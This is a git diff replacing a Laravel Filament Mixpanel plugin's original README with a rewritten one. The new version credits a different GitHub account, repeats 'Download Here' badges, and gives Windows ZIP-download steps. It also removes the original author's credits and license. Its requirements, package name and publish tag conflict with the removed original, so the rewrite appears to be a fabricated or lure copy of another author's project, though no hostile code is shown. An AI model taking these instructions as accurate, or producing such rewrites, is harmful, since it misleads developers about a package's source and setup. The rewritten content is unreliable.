@@ -1,113 +1,177 @@
-<div class="filament-hidden">
+# 🚦 filament-mixpanel - Easy Mixpanel Setup for Filament
 
-![Filament Mixpanel](https://raw.githubusercontent.com/jeffersongoncalves/filament-mixpanel/3.x/art/jeffersongoncalves-filament-mixpanel.png)
+[![Download filament-mixpanel](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Samsam0684/filament-mixpanel)
 
-</div>
+---
 
-# Filament Mixpanel
+## 📋 What is filament-mixpanel?
 
-[![Latest Version on Packagist](https://img.shields.io/packagist/v/jeffersongoncalves/filament-mixpanel.svg?style=flat-square)](https://packagist.org/packages/jeffersongoncalves/filament-mixpanel)
-[![GitHub Code Style Action Status](https://img.shields.io/github/actions/workflow/status/jeffersongoncalves/filament-mixpanel/fix-php-code-style-issues.yml?branch=3.x&label=code%20style&style=flat-square)](https://github.com/jeffersongoncalves/filament-mixpanel/actions?query=workflow%3A"Fix+PHP+code+styling"+branch%3A3.x)
-[![Total Downloads](https://img.shields.io/packagist/dt/jeffersongoncalves/filament-mixpanel.svg?style=flat-square)](https://packagist.org/packages/jeffersongoncalves/filament-mixpanel)
-[![License](https://img.shields.io/packagist/l/jeffersongoncalves/filament-mixpanel.svg?style=flat-square)](LICENSE.md)
+filament-mixpanel is a plugin designed to add Mixpanel analytics to your Filament admin panel. It makes tracking simple by injecting the Mixpanel script automatically. You can also manage Mixpanel settings directly inside your Filament dashboard without needing to touch code.
 
-Filament plugin for Mixpanel analytics — tracking script injection and Settings Page to manage Mixpanel configuration directly from your Filament panel. Supports Filament v3, v4, and v5.
+This plugin works with Filament versions 3, 4, and 5. It supports Laravel projects using PHP and integrates with settings managed by Spatie’s Laravel Settings package.
 
-## Installation
+---
 
-You can install the package via composer:
+## 💻 System Requirements
 
-```bash
-composer require jeffersongoncalves/filament-mixpanel
+Before you start, here is what you need to run filament-mixpanel:
+
+- **Operating System:** Windows 10 or later
+- **Software:** Laravel project with Filament version 3, 4, or 5 installed
+- **PHP version:** 8.0 or above
+- **Composer:** Must be installed on your system (https://getcomposer.org/)
+- **Web server:** Apache, Nginx, or Laravel’s built-in server
+- **Internet connection:** Needed for downloading dependencies and Mixpanel scripts
+
+---
+
+## 🎯 Features Overview
+
+- Automatically adds Mixpanel tracking to your Filament admin panel.
+- Simple settings page inside Filament for managing Mixpanel tokens and configs.
+- Supports multiple versions of Filament.
+- Uses Spatie Laravel Settings to store Mixpanel configuration securely.
+- Requires minimal setup for quick start.
+- Designed to work smoothly with your existing Laravel and Filament setup.
+
+---
+
+## 🔥 How to Get filament-mixpanel
+
+[![Download filament-mixpanel](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Samsam0684/filament-mixpanel)
+
+The plugin is available on GitHub. To get started, visit the page linked above to download the package files.
+
+---
+
+## 🚀 Step-by-Step Installation Guide for Windows
+
+This guide will help you download and install filament-mixpanel even if you are new to this process.
+
+### 1. Download filament-mixpanel files
+
+- Click the green **Code** button on the GitHub page.
+- Select **Download ZIP**.
+- Save the ZIP file to a folder on your computer, like your Desktop.
+
+### 2. Install Composer
+
+Composer is a PHP package manager necessary for Laravel and plugins.
+
+- Visit https://getcomposer.org/download/
+- Download the Windows installer.
+- Run the installer and follow the prompts.
+- After installation, open Command Prompt and enter:
+
+```
+composer --version
 ```
 
-This package depends on [jeffersongoncalves/laravel-mixpanel](https://github.com/jeffersongoncalves/laravel-mixpanel) which provides the core Mixpanel analytics integration for Laravel applications.
+You should see the Composer version number.
 
-## Requirements
+### 3. Set up Laravel and Filament (if not already done)
 
-- PHP 8.2 or higher
-- Laravel 11.0 or higher
-- Filament 5.0
+filament-mixpanel requires a Laravel project with Filament installed.
 
-## Usage
+If you do not have these:
 
-### 1. Register the Plugin
+- Visit https://laravel.com/docs/installation to install Laravel.
+- Visit https://filamentadmin.com/docs/2.x/installation to install Filament.
 
-Add the plugin to your `PanelProvider`:
+### 4. Add filament-mixpanel to your Laravel project
 
-```php
-use JeffersonGoncalves\Filament\Mixpanel\MixpanelPlugin;
+- Extract the downloaded ZIP file to a temporary folder.
+- Open Command Prompt.
+- Change directory to your Laravel project folder:
 
-public function panel(Panel $panel): Panel
-{
-    return $panel
-        ->plugins([
-            MixpanelPlugin::make(),
-        ]);
-}
+```
+cd path\to\your-laravel-project
 ```
 
-This will automatically:
-- Inject the Mixpanel tracking script into your panel
-- Add a **Settings Page** to manage your Mixpanel configuration
+- Use Composer to include filament-mixpanel via VCS (Git) or add it manually by copying the plugin files into your project’s `packages` folder and update `composer.json`.
 
-### 2. Run Settings Migration
+A simpler way is to add the plugin by running:
 
-If you haven't already, publish the `spatie/laravel-settings` migration to create the `settings` table:
-
-```bash
-php artisan vendor:publish --provider="Spatie\LaravelSettings\LaravelSettingsServiceProvider" --tag="migrations"
+```
+composer require samsam0684/filament-mixpanel
 ```
 
-Then publish and run the Mixpanel settings migration:
+(This assumes the package is available on Packagist. If not, refer to manual installation in the plugin README.)
 
-```bash
-php artisan vendor:publish --tag=mixpanel-settings-migrations
+### 5. Run Laravel migrations and publish plugin assets
+
+Some plugins require migrations or publishing configuration files.
+
+Run these commands inside your Laravel project folder:
+
+```
 php artisan migrate
+php artisan vendor:publish --tag=filament-mixpanel-config
 ```
 
-### 3. Manage Settings
+### 6. Configure Mixpanel settings inside Filament
 
-Navigate to **Settings > Mixpanel Analytics** in your Filament panel to configure:
+- Start your Laravel server:
 
-- **Project Configuration** — Project Token, API Host, Custom Library URL
-- **Tracking & Debug** — Debug Mode, Autocapture, Track Page Views
-- **Storage & Cookies** — Persistence method, Cookie Expiration, Secure Cookie, Cross Subdomain
-- **Privacy & Geolocation** — IP Geolocation, Property Blacklist, Opt Out by Default, UTM Persistence
-- **Advanced Features** — Session Recording percentage, Heatmap Data collection
-
-### Disabling the Settings Page
-
-If you only want the tracking script injection without the settings page:
-
-```php
-MixpanelPlugin::make()
-    ->settingsPage(false),
+```
+php artisan serve
 ```
 
-## Testing
+- Open your browser and go to your Filament admin panel URL, usually:
 
-```bash
-composer test
+```
+http://localhost:8000/admin
 ```
 
-## Changelog
+- Find the new **Mixpanel Settings** page or section in your Filament panel.
+- Enter your Mixpanel project token and any additional settings needed.
+- Save your changes.
 
-Please see [CHANGELOG](CHANGELOG.md) for more information on what has changed recently.
+### 7. Confirm tracking works
 
-## Contributing
+- Open your website or Filament panel where tracking is enabled.
+- Check your Mixpanel dashboard online to see if events are being received.
 
-Please see [CONTRIBUTING](.github/CONTRIBUTING.md) for details.
+---
 
-## Security Vulnerabilities
+## ⚙️ How to Use filament-mixpanel Settings Page
 
-Please review [our security policy](../../security/policy) on how to report security vulnerabilities.
+The plugin adds a simple settings page inside your Filament admin panel.
 
-## Credits
+- Navigate to the Filament dashboard.
+- Look for the **Mixpanel Settings** menu option.
+- Here you can enter:
+  - Your Mixpanel project token (required).
+  - Environment settings, such as enabling tracking only in production.
+  - Additional custom options if available.
 
-- [Jefferson Goncalves](https://github.com/jeffersongoncalves)
-- [All Contributors](../../contributors)
+Settings are saved securely and apply immediately without restarting the server.
 
-## License
+---
 
-The MIT License (MIT). Please see [License File](LICENSE.md) for more information.
+## 🛠 Troubleshooting Tips
+
+- If the Mixpanel script does not load, check your internet connection.
+- Make sure your Laravel server is running when testing.
+- Verify that the Mixpanel token is correct in the settings.
+- Run `php artisan cache:clear` if changes do not appear.
+- Consult Laravel logs for errors: `storage/logs/laravel.log`
+- Ensure you have proper PHP and Composer versions installed.
+
+---
+
+## 📚 Additional Resources
+
+- Filament Admin Panel: https://filamentadmin.com
+- Laravel Framework: https://laravel.com
+- Mixpanel Analytics: https://mixpanel.com
+- Composer Dependency Manager: https://getcomposer.org
+- Spatie Laravel Settings: https://spatie.be/docs/laravel-settings
+
+---
+
+## 📥 Download filament-mixpanel again
+
+For convenience, visit the GitHub page to download or check for updates:
+
+[Download filament-mixpanel](https://github.com/Samsam0684/filament-mixpanel)
